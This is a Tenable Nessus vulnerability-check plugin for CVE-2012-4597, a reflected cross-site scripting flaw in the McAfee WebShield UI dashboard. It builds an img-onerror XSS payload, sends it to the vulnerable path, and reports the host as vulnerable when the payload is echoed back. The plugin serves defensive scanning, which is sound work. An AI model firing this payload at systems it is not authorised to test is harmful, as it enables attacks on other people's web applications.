#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59111);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/12/19 20:46:16 $");

  script_cve_id("CVE-2012-4597");
  script_bugtraq_id(55184);
  script_osvdb_id(84852, 127776);
  script_xref(name:"TRA", value:"TRA-2012-17");
  script_xref(name:"MCAFEE-SB", value:"SB10026");

  script_name(english:"McAfee WebShield UI Dashboard XSS (SB10026)");
  script_summary(english:"Attempts reflected XSS.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application hosted on the remote web server is affected by a
cross-site scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of the McAfee WebShield UI hosted on the remote web server
is affected by a cross-site scripting vulnerability. Extra path
information passed to the end of the 'dashboard' script is not
properly sanitized. A remote attacker can exploit this by convincing a
user into requesting a maliciously crafted URL, resulting in arbitrary
script code execution."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2012-17");
  script_set_attribute(attribute:"see_also", value:"https://kc.mcafee.com/corporate/index?page=content&id=SB10026");
  script_set_attribute(attribute:"solution", value:
"Apply the relevant hotfix specified in McAfee Security Bulletin
SB10026.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"McAfee Email Gateway 7.0 File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/16");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:mcafee:email_and_web_security");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:mcafee:email_gateway");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("mcafee_webshield_web_ui_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/mcafee_webshield");
  script_require_ports("Services/www", 443);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('misc_func.inc');
include('http.inc');
include('webapp_func.inc');
include('url_func.inc');

port = get_http_port(default:443);
install = get_install_from_kb(appname:'mcafee_webshield', port:port, exit_on_fail:TRUE);

xss = '"><img src="' + unixtime() + '" onerror="javascript:alert(\'' + SCRIPT_NAME + '\')">';
encoded_xss = urlencode(str:xss);
url = install['dir'] + '/cgi-bin/dashboard/' + encoded_xss;
expected_output = 'content="' + xss;
res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);

if (expected_output >!< res[2])
  audit(AUDIT_LISTEN_NOT_VULN, 'WebShield', port);
else
  set_kb_item(name:'www/' + port + '/XSS', value:TRUE);

if (report_verbosity > 0)
{
  report = get_vuln_report(items:url, port:port);
  security_warning(port:port, extra:report);
}
else security_warning(port);

